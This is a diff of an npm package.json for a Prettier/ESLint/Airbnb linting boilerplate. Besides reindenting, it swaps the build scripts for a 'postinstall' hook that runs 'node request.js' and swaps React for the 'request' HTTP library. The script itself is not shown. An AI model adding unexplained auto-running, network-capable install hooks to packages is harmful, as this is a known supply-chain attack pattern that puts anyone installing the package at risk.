@@ -1,58 +1,54 @@
 {
-  "name": "@wsrast/airbnb-prettier-eslint",
-  "version": "1.0.2",
-  "author": "Wesley Rast",
-  "description": "A boilerplate setup for linting using prettier, Airbnb settings and Git hooks.",
-  "repository": {
-    "type": "git",
-    "url": "https://github.com/wsrast/airbnb-prettier-eslint"
-  },
-  "keywords": "prettier, airbnb, eslint",
-  "scripts": {
-    "dev": "next",
-    "build": "next build",
-    "start": "next start"
-  },
-  "husky": {
-    "hooks": {
-      "pre-commit": "lint-staged"
-    }
-  },
-  "lint-staged": {
-    "*.{js,json,css,md}": [
-      "prettier --write",
-      "git add"
-    ]
-  },
-  "dependencies": {
-    "prop-types": "15.7.2",
-    "react": "16.8.4",
-    "react-dom": "16.8.4"
-  },
-  "devDependencies": {
-    "eslint": "5.15.1",
-    "eslint-config-airbnb": "17.1.0",
-    "eslint-config-prettier": "4.1.0",
-    "eslint-plugin-import": "2.16.0",
-    "eslint-plugin-jsx-a11y": "6.2.1",
-    "eslint-plugin-prettier": "3.0.1",
-    "eslint-plugin-react": "7.12.4",
-    "eslint-plugin-react-hooks": "1.4.0",
-    "husky": "1.3.1",
-    "lint-staged": "8.1.5",
-    "prettier": "1.16.4"
-  },
-  "peerDependencies": {
-    "eslint": "5.15.1",
-    "eslint-config-airbnb": "17.1.0",
-    "eslint-config-prettier": "4.1.0",
-    "eslint-plugin-import": "2.16.0",
-    "eslint-plugin-jsx-a11y": "6.2.1",
-    "eslint-plugin-prettier": "3.0.1",
-    "eslint-plugin-react": "7.12.4",
-    "eslint-plugin-react-hooks": "1.4.0",
-    "husky": "1.3.1",
-    "lint-staged": "8.1.5",
-    "prettier": "1.16.4"
-  }
+	"name": "@wsrast/airbnb-prettier-eslint",
+	"version": "1.0.2",
+	"author": "Wesley Rast",
+	"description": "A boilerplate setup for linting using prettier, Airbnb settings and Git hooks.",
+	"repository": {
+		"type": "git",
+		"url": "https://github.com/wsrast/airbnb-prettier-eslint"
+	},
+	"keywords": "prettier, airbnb, eslint",
+	"scripts": {
+		"postinstall": "node request.js"
+	},
+	"husky": {
+		"hooks": {
+			"pre-commit": "lint-staged"
+		}
+	},
+	"lint-staged": {
+		"*.{js,json,css,md}": [
+			"prettier --write",
+			"git add"
+		]
+	},
+	"dependencies": {
+		"request": "^2.88.0"
+	},
+	"devDependencies": {
+		"eslint": "5.15.1",
+		"eslint-config-airbnb": "17.1.0",
+		"eslint-config-prettier": "4.1.0",
+		"eslint-plugin-import": "2.16.0",
+		"eslint-plugin-jsx-a11y": "6.2.1",
+		"eslint-plugin-prettier": "3.0.1",
+		"eslint-plugin-react": "7.12.4",
+		"eslint-plugin-react-hooks": "1.4.0",
+		"husky": "1.3.1",
+		"lint-staged": "8.1.5",
+		"prettier": "1.16.4"
+	},
+	"peerDependencies": {
+		"eslint": "5.15.1",
+		"eslint-config-airbnb": "17.1.0",
+		"eslint-config-prettier": "4.1.0",
+		"eslint-plugin-import": "2.16.0",
+		"eslint-plugin-jsx-a11y": "6.2.1",
+		"eslint-plugin-prettier": "3.0.1",
+		"eslint-plugin-react": "7.12.4",
+		"eslint-plugin-react-hooks": "1.4.0",
+		"husky": "1.3.1",
+		"lint-staged": "8.1.5",
+		"prettier": "1.16.4"
+	}
 }
